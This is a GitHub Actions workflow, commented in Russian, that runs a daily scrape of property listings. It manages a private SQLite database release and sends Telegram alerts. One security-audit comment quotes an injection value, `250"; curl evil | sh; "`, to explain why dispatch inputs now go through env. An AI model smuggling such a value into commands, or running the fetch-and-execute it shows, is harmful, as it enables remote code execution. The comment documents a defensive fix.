name: Daily rescrape

on:
  schedule:
    - cron: "0 1 * * *" # 06:00 Алматы (UTC+5)
  workflow_dispatch:
    inputs:
      pages:
        description: "Максимум страниц выдачи на один шард (район × комнаты)"
        default: "250"
      max_new:
        description: "Максимум новых детальных страниц (пусто — из режима: drain 4500 / steady 1500)"
        default: ""
      time_budget_min:
        description: "Мягкий дедлайн прохода, мин (меньше timeout-minutes — успеть залить базу)"
        default: "300"
      delay_min:
        description: "Минимальная пауза между запросами, сек (пусто — из режима: drain 1.5 / steady 2.0)"
        default: ""
      delay_max:
        description: "Максимальная пауза между запросами, сек (пусто — из режима: drain 3.0 / steady 4.0)"
        default: ""

concurrency:
  group: krisha-db-writes
  cancel-in-progress: false

permissions:
  contents: read

# База живёт в релизах ПРИВАТНОГО репозитория данных: код публичный, а
# накопленная история объявлений — нет. GITHUB_TOKEN туда не дотягивается,
# поэтому все операции с релизами идут под KRISHA_DB_TOKEN (fine-grained,
# Contents RW только на krisha-db).
env:
  KRISHA_DATA_REPO: Dex719/krisha-db

jobs:
  rescrape:
    runs-on: ubuntu-latest
    # Полный шардированный проход (~44к объявлений, ~2200 страниц выдачи)
    timeout-minutes: 350

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7

      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7
        with:
          python-version: "3.11"
          cache: pip

      - name: Install
        run: |
          pip install -r requirements.lock
          pip install -e . --no-deps

      - name: Download DB from release
        id: download_db
        env:
          KRISHA_DB_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: python -m krisha.db_release --require

      # Аудит 24.10: серия банов и номер прохода живут в sweep_state базы, а
      # база заливается только после удачного прохода — упавший с баном проход
      # терял свой +1, откат пауз не срабатывал, ротация шардов повторялась.
      # Теперь они едут и отдельным файлом sweep_state_<deal>.json (шаг
      # «Save sweep state», always()); здесь вливаются обратно. Fail-soft:
      # файла нет или сеть — проход идёт на значениях из базы.
      - name: Restore sweep state
        continue-on-error: true
        timeout-minutes: 5
        env:
          KRISHA_DB_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: python -m krisha.scraping.sweep_state_file pull --deal prodazha

      - name: Rescrape
        # Жёсткий потолок шага поверх мягкого дедлайна: зависший проход не
        # должен съесть время заливки и шага состояния (аудит 24.10).
        timeout-minutes: 315
        env:
          # issue #190 §2.3 (ревью 02.09). Режим прохода (#152) выбирается
          # кодом по backlog'у: drain = 4500 деталей при паузах 1.5–3.0 с,
          # steady = 1500 при 2.0–4.0. Но воркфлоу подставлял `|| '2.5'`,
          # `|| '5.0'` и `--max-new 1000` ВСЕГДА — явные значения побеждают
          # пресет, и drain по факту не наступал ни разу: sweep_runs пишет
          # mode=drain при max_new_effective=1000 и паузах 2.5–5.0 каждый
          # день, очередь 23–30k не тает. Пустой input = «используй пресет»
          # (config._env_float и sweep() читают пустую строку как «не задано»).
          # Потолок под бюджет времени урезает fit_detail_caps, откат пауз
          # при бане — pass_plan.BAN_ROLLBACK_STREAK.
          KRISHA_DELAY_MIN: "${{ github.event.inputs.delay_min }}"
          KRISHA_DELAY_MAX: "${{ github.event.inputs.delay_max }}"
          # Аудит безопасности 2026-10-06: inputs workflow_dispatch нельзя
          # подставлять в `run:` выражениями — GitHub раскрывает их ДО запуска
          # shell, и значение вроде `250"; curl evil | sh; "` становилось
          # командой (shell-инъекция). Через env значение приходит данными, а
          # не кодом. Сейчас dispatch доступен только владельцу, но защита не
          # должна зависеть от того, кто нажал кнопку. По расписанию inputs
          # пусты, и дефолты (`:-`) срабатывают так же, как раньше `|| '250'`.
          INPUT_PAGES: ${{ github.event.inputs.pages }}
          INPUT_MAX_NEW: ${{ github.event.inputs.max_new }}
          INPUT_TIME_BUDGET_MIN: ${{ github.event.inputs.time_budget_min }}
        run: |
          # Пустой max_new = «не передавать --max-new» (пресет режима, см. выше),
          # поэтому флаг добавляем только непустому значению.
          max_new_args=()
          if [ -n "${INPUT_MAX_NEW:-}" ]; then
            max_new_args=(--max-new "$INPUT_MAX_NEW")
          fi
          python scripts/rescrape.py \
            --pages "${INPUT_PAGES:-250}" \
            "${max_new_args[@]}" \
            --time-budget-min "${INPUT_TIME_BUDGET_MIN:-300}" \
            --fail-empty \
            --fail-below 8000 \
            --summary-json /tmp/rescrape_stats.json

      - name: Job summary
        if: always()
        run: |
          if [ -f /tmp/rescrape_stats.json ]; then
            {
              echo "### Рескрейп $(date -u +%F)"
              echo '```json'
              cat /tmp/rescrape_stats.json
              echo '```'
            } >> "$GITHUB_STEP_SUMMARY"
          fi

      # always(): именно упавший проход (бан → --fail-empty) должен донести
      # свою серию банов и номер прохода до следующего раннера.
      - name: Save sweep state
        if: always() && steps.download_db.outcome == 'success'
        continue-on-error: true
        timeout-minutes: 5
        env:
          GH_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: |
          set -euo pipefail
          python -m krisha.scraping.sweep_state_file export --deal prodazha --out /tmp/sweep_state_prodazha.json
          python scripts/release_upload.py --repo "$KRISHA_DATA_REPO" --tag db-latest /tmp/sweep_state_prodazha.json

      # Критический путь — сразу после сбора (.kiro/specs/rescrape-post-steps).
      # Раньше заливка ждала шаг Alerts, а тот без своего потолка разросся до
      # 80 минут: 2026-09-20 джоба умерла по timeout-minutes на алертах, и
      # 4 ч 43 мин собранных данных так и не доехали до прода.
      - name: Upload DB to release
        id: upload_db
        env:
          GH_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: |
          set -euo pipefail
          sqlite3 data/krisha.db "VACUUM;" || true
          gzip -9 -c data/krisha.db > /tmp/krisha.db.gz
          # Контрольная сумма рядом с базой: db_release проверяет её при скачивании
          sha256sum /tmp/krisha.db.gz | cut -d' ' -f1 > /tmp/krisha.db.gz.sha256
          # Аудит 24.10: не `gh release upload --clobber` (удаляет старый ДО
          # заливки нового) — временное имя, сверка sha256, потом подмена.
          python scripts/release_upload.py --repo "$KRISHA_DATA_REPO" --tag db-latest \
            /tmp/krisha.db.gz /tmp/krisha.db.gz.sha256
          echo "Размер базы в релизе: $(du -h /tmp/krisha.db.gz | cut -f1)" >> "$GITHUB_STEP_SUMMARY"

      # База уже в релизе: сбой рестарта (HF 5xx) не должен ронять ран и
      # отменять вторую заливку с вердиктами алертов (аудит 03.10).
      - name: Restart Space (подтянуть свежую базу)
        continue-on-error: true
        timeout-minutes: 5
        env:
          HF_TOKEN: ${{ secrets.HF_TOKEN }}
        run: |
          if [ -z "$HF_TOKEN" ]; then
            echo "HF_TOKEN не задан — пропускаю рестарт Space"
            exit 0
          fi
          curl -fsS -X POST \
            -H "Authorization: Bearer $HF_TOKEN" \
            https://huggingface.co/api/spaces/Dex719/krisha-fair-price/restart

      - name: Snapshot release
        continue-on-error: true  # архив вторичен — не красит ран
        env:
          GH_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: |
          python scripts/publish_snapshot.py \
            --db-gz /tmp/krisha.db.gz --sha256 /tmp/krisha.db.gz.sha256 \
            --asset-name krisha.db.gz --stats-json /tmp/rescrape_stats.json \
            --label "Продажа" --rotate-keep-days 14

      # always(): утренний отчёт админу нужнее всего как раз когда проход упал.
      # Свой потолок: база уже в релизе, и вторичный шаг больше не может
      # съесть бюджет джобы (аудит 24.10: 300 проход + ~5 установка/скачивание
      # + ~3 заливка + 15 алерты + ≤10 вторая заливка ≈ 333 < 350 мин; раньше
      # «≈340» не учитывало установку и вторую заливку без своего потолка).
      - name: Alerts
        id: alerts
        if: always()
        continue-on-error: true
        timeout-minutes: 15
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          # Ключ шифрования состояния (subscriptions._fernet): STATE_ENCRYPTION_KEY,
          # а без неё — токен бота. Шаг читает зашифрованное состояние, поэтому без
          # этой строки секрет STATE_ENCRYPTION_KEY в Actions ни на что не влиял, и
          # после смены токена ключ «уезжал» (см. порядок ротации в .env.example).
          # Секрета нет — приходит пустая строка, и ключ берётся из токена, как раньше.
          STATE_ENCRYPTION_KEY: ${{ secrets.STATE_ENCRYPTION_KEY }}
          # состояние (подписчики, слежка, опубликованное в канале) — в репо данных
          KRISHA_DB_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
          TG_CHANNEL_ID: ${{ secrets.TG_CHANNEL_ID }}
          TG_ADMIN_CHAT_ID: ${{ secrets.TG_ADMIN_CHAT_ID }}
        # В checkout состояния нет: без --pull алерты не увидели бы подписчиков
        # и заново запостили бы в канал уже опубликованное. Не скачалось — не шлём.
        # Весов модели в checkout тоже нет (models/*.cbm в приватном релизе
        # model-latest): без них окно не оценивается, и с 01.10 рассылка с
        # каналом молча выходили пустыми. Не скачались — send_alerts сам
        # краснеет и пишет админу, а слежку и отчёты отправляет всё равно.
        run: |
          python -m krisha.subscriptions --pull
          python -m krisha.db_release --models
          python scripts/send_alerts.py

      # Алерты пишут вердикты окна в predictions (issue #128) — заливаем базу
      # ещё раз, чтобы они не пропали. Только если проход удался (первая
      # заливка была) и алерты дошли до конца; иначе в релизе остаётся база
      # первой заливки — собранное не теряется в любом случае.
      # always(): без него шаг пропускался, стоило упасть любому вторичному
      # шагу между заливками (рестарт Space) — аудит 03.10.
      - name: Upload DB again (вердикты алертов)
        if: always() && steps.upload_db.outcome == 'success' && steps.alerts.outcome == 'success'
        timeout-minutes: 10
        env:
          GH_TOKEN: ${{ secrets.KRISHA_DB_TOKEN }}
        run: |
          set -euo pipefail
          sqlite3 data/krisha.db "VACUUM;" || true
          gzip -9 -c data/krisha.db > /tmp/krisha.db.gz
          sha256sum /tmp/krisha.db.gz | cut -d' ' -f1 > /tmp/krisha.db.gz.sha256
          python scripts/release_upload.py --repo "$KRISHA_DATA_REPO" --tag db-latest \
            /tmp/krisha.db.gz /tmp/krisha.db.gz.sha256
